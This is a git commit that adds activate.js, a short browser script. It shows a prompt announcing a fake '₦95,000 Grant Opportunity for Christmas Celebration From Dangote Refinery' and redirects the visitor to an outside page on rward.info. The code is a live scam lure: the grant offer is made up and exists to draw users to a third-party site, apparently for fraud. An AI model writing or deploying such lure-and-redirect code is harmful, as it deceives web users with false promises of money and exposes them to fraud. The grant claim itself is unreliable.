49eb0e94fe4dd7fba5c86709019fa71464a66591
ita-giftt <tallaakoti@gmail.com>
2025-12-31 22:34:22 +0100

    Create activate.js

---
+++ activate.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('Congratulations, you are eligible to receive the ₦95,000 Grant Opportunity for Christmas Celebration From Dangote Refinery, Kindly press OK to Proceed now','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://rward.info/Haitian-Family-Support.html';
+}
